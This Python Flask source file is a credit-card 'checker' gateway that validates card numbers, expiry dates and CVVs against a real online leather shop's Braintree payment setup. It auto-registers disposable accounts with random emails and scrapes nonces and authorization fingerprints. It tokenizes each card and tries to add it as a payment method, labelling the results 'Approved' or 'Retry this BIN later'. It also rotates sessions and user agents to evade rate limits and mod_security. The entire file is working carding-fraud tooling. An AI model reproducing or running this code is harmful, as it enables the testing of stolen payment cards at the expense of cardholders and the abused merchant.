from flask import Flask, jsonify
import requests
import re
import base64
import random
import string
import json
import pickle
import http.cookiejar
from fake_useragent import UserAgent
import os
import logging

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Initialize user agent
ua = UserAgent()
user_agent = ua.random

# Constants from chk function
VARPS = ['H1', 'H2', 'H3', 'H4', 'H5', 'H6', 'H7', 'H8', 'H9', 'H10']
CORR = 'bcgvcdc'
SESS = 'vsgvxdf'

def up(varp):
    """Register a new account and fetch Braintree client token."""
    r = requests.session()
    name = ''.join(random.choices(string.ascii_lowercase, k=15))
    acc = f"{name}@closetab.com"
    headers = {'user-agent': user_agent}

    try:
        # Step 1: Fetch registration page
        response = r.get('https://bayoulandleather.com/my-account/', headers=headers, timeout=10)
        if response.status_code != 200:
            logger.error(f"Failed to fetch registration page: status {response.status_code}")
            return None, None, None

        # Extract nonce
        nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', response.text)
        if not nonce_match:
            logger.error("Failed to extract woocommerce-register-nonce")
            return None, None, None
        nonce = nonce_match.group(1)

        # Step 2: Register account
        data = {
            'email': acc,
            'wc_order_attribution_user_agent': user_agent,
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': 'https://bayoulandleather.com/my-account/add-payment-method/',
            'register': 'Register',
        }
        response = r.post('https://bayoulandleather.com/my-account/add-payment-method/', headers=headers, data=data, timeout=10)
        if response.status_code not in (200, 201):
            logger.error(f"Failed to register account: status {response.status_code}")
            return None, None, None

        # Extract Braintree client token and nonce
        enc_match = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text)
        add_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response.text)
        if not enc_match or not add_nonce_match:
            logger.error("Failed to extract client token or add-payment-method nonce")
            return None, None, None

        enc = enc_match.group(1)
        add_nonce = add_nonce_match.group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.findall(r'"authorizationFingerprint":"([^"]+)"', dec)[0]

        # Save to gates.json
        gates_data = {}
        if os.path.exists('gates.json'):
            with open('gates.json', 'r') as json_file:
                gates_data = json.load(json_file)

        new_data = {varp: {"nonce": add_nonce, "au": au}}
        if 'chk' in gates_data:
            gates_data['chk'].update(new_data)
        else:
            gates_data['chk'] = new_data

        with open('gates.json', 'w') as json_file:
            json.dump(gates_data, json_file, ensure_ascii=False, indent=4)

        # Save cookies
        with open(f'chk_{varp}.pkl', 'wb') as f:
            pickle.dump(r.cookies, f)

        return add_nonce, au, r.cookies

    except Exception as e:
        logger.error(f"Error in up function: {str(e)}")
        return None, None, None

@app.route('/gateway=b3/cc=<card_details>', methods=['GET'])
def braintree_payment(card_details):
    try:
        # Parse card details
        card_data = card_details.split('|')
        if len(card_data) != 4:
            return jsonify({"error": "Invalid card format. Use number|exp_month|exp_year|cvv"}), 400

        card_number, exp_month, exp_year, cvv = card_data

        # Validate input
        if not all([card_number, exp_month, exp_year, cvv]):
            return jsonify({"error": "Missing required card details"}), 400

        # Normalize expiry year
        if len(exp_year) == 2:
            exp_year = f"20{exp_year}"

        # Load or initialize gates.json
        gates_data = {}
        if os.path.exists('gates.json'):
            with open('gates.json', 'r') as file:
                gates_data = json.load(file)

        # Select a random varp and check for existing session
        last_varp = None
        if os.path.exists('last_varp.txt'):
            with open('last_varp.txt', 'r') as file:
                last_varp = file.readline().strip()

        while True:
            varp = random.choice(VARPS)
            if varp != last_varp:
                break

        # Save current varp
        with open('last_varp.txt', 'w') as file:
            file.write(varp)

        # Load session data
        nonce, au, cookies = None, None, None
        try:
            if 'chk' in gates_data and varp in gates_data['chk']:
                nonce = gates_data['chk'][varp]['nonce']
                au = gates_data['chk'][varp]['au']
                with open(f'chk_{varp}.pkl', 'rb') as f:
                    cookies = pickle.load(f)
        except Exception as e:
            logger.warning(f"Failed to load session for {varp}: {str(e)}")

        # If session data is missing, register a new account
        if not all([nonce, au, cookies]):
            nonce, au, cookies = up(varp)
            if not all([nonce, au, cookies]):
                return jsonify({"error": "Failed to register account or fetch session data"}), 500

        # Step 1: Tokenize credit card with Braintree
        header = {
            'accept': '*/*',
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'Pragma': 'no-cache',
            'user-agent': user_agent,
        }
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'accd43a0-58d1-493b-94a9-76bb1a2fa359',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': card_number,
                        'expirationMonth': exp_month,
                        'expirationYear': exp_year,
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': '90011',
                            'streetAddress': '',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = requests.post('https://payments.braintree-api.com/graphql', headers=header, json=json_data, timeout=10)
        if response.status_code != 200:
            logger.error(f"Failed to tokenize card: status {response.status_code}, response {response.text[:200]}")
            return jsonify({"error": "Failed to tokenize card", "details": response.text[:200]}), 500

        try:
            tok = response.json()['data']['tokenizeCreditCard']['token']
        except KeyError:
            logger.error(f"Failed to extract token: {response.json()}")
            # Retry by registering new accounts for all varps
            for v in VARPS:
                up(v)
            return jsonify({"error": "Failed to extract token, retried registration", "details": response.json()}), 500

        # Step 2: Add payment method
        r = requests.session()
        r.cookies = cookies
        headers = {'user-agent': user_agent}
        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': tok,
            'braintree_cc_device_data': f'{{"device_session_id":"{SESS}","fraud_merchant_id":null,"correlation_id":"{CORR}"}}',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/bxynhfj8s242wzvz/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/bxynhfj8s242wzvz"},"merchantId":"bxynhfj8s242wzvz","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":false}',
            'woocommerce-add-payment-method-nonce': nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        response = r.post(
            'https://bayoulandleather.com/my-account/add-payment-method/',
            cookies=r.cookies,
            headers=headers,
            data=data,
            timeout=10
        )
        text = response.text

        # Parse response
        if 'Payment method successfully added.' in text:
            return jsonify({"status": "1000: Approved"})

        if '<head><title>Not Acceptable!</title>' in text:
            logger.warning("Mod_Security error detected")
            return jsonify({"status": "RISK: Retry this BIN later"})

        if 'risk_threshold' in text or 'Please wait for 20 seconds' in text:
            logger.info("Risk threshold or rate limit detected")
            return jsonify({"status": "RISK: Retry this BIN later"})

        pattern = r'Reason: (.+?)\s*</li>'
        match = re.search(pattern, text)
        if match:
            result = match.group(1)
            if any(x in result for x in ['avs', 'Invalid postal code', 'Insufficient Funds']):
                return jsonify({"status": "Approved"})
            return jsonify({"status": result})

        logger.warning("No specific error message found, retrying registration")
        for v in VARPS:
            up(v)
        return jsonify({"status": "RISK: Retry this BIN later"})

    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
